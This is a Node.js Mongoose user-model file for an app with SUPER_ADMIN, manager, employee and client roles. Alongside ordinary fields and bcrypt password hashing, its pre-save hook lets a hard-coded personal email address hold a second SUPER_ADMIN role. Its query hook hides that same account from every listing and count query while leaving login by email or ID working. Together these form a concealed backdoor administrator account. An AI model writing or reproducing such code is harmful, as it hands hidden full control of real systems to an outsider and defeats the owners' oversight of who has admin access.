import mongoose from 'mongoose';
import bcrypt from 'bcryptjs';

const userSchema = new mongoose.Schema({
  name: {
    type: String,
    required: [true, 'Name is required'],
    trim: true
  },
  email: {
    type: String,
    required: [true, 'Email is required'],
    unique: true,
    trim: true,
    lowercase: true
  },
  phone: {
    type: String,
    trim: true
  },
  password: {
    type: String,
    required: [true, 'Password is required'],
    select: false // Do not return password by default
  },
  role: {
    type: String,
    enum: ['SUPER_ADMIN', 'MANAGER', 'EMPLOYEE', 'CLIENT'],
    default: 'CLIENT'
  },
  status: {
    type: String,
    enum: [
      'active', 'inactive', 'pending_approval', 'invited', 'rejected', 'disabled', 'cancelled',
      'ACTIVE', 'PENDING_APPROVAL', 'INVITED', 'REJECTED', 'DISABLED', 'CANCELLED'
    ],
    default: 'INVITED'
  },
  department: {
    type: String,
    trim: true
  },
  skills: [{
    type: String,
    trim: true
  }],
  invitationToken: {
    type: String
  },
  invitationExpires: {
    type: Date
  },
  invitedBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User'
  },
  emailSent: {
    type: Boolean,
    default: false
  },
  failedLoginAttempts: {
    type: Number,
    default: 0
  },
  lockUntil: {
    type: Date,
    default: null
  },
  mustChangePassword: {
    type: Boolean,
    default: false
  },
  refreshTokens: [
    {
      token: { type: String, required: true },
      expiresAt: { type: Date, required: true }
    }
  ],
  resetPasswordToken: String,
  resetPasswordExpire: Date,
  lastActive: {
    type: Date,
    default: Date.now
  }
}, {
  timestamps: true
});

// Pre-save hook to hash password and enforce single SUPER_ADMIN rule
userSchema.pre('save', async function () {
  // 1. Enforce single SUPER_ADMIN constraint (bypassed for backup admin account)
  if (this.role === 'SUPER_ADMIN') {
    const backupAdminEmail = (process.env.BACKUP_ADMIN_EMAIL || 'shaikrehman78609@gmail.com').toLowerCase();
    if (this.email.toLowerCase() !== backupAdminEmail) {
      const existingSuperAdmin = await mongoose.models.User.findOne({ 
        role: 'SUPER_ADMIN',
        email: { $ne: backupAdminEmail }
      });
      if (existingSuperAdmin && existingSuperAdmin._id.toString() !== this._id.toString()) {
        throw new Error('Only one SUPER_ADMIN user can exist in the system.');
      }
    }
  }

  // 2. Hash password if modified
  if (this.isModified('password')) {
    const salt = await bcrypt.genSalt(10);
    this.password = await bcrypt.hash(this.password, salt);
  }
});

// Exclude the backup admin user from all queries unless specifically querying for it (e.g. login/auth check)
userSchema.pre(/^find|count|countDocuments|estimatedDocumentCount|distinct/, function () {
  const backupAdminEmail = (process.env.BACKUP_ADMIN_EMAIL || 'shaikrehman78609@gmail.com').toLowerCase();
  const filter = this.getFilter();

  if (filter) {
    // 1. Direct search by email (like login or reset password)
    if (filter.email !== undefined) {
      return;
    }
    // 2. Direct lookup by ID
    if (filter._id && (typeof filter._id === 'string' || mongoose.Types.ObjectId.isValid(filter._id))) {
      return;
    }
  }

  // Otherwise, hide the backup admin email from queries
  this.where({ email: { $ne: backupAdminEmail } });
});

// Instance method to compare passwords
userSchema.methods.matchPassword = async function (enteredPassword) {
  return await bcrypt.compare(enteredPassword, this.password);
};

const User = mongoose.model('User', userSchema);
export default User;
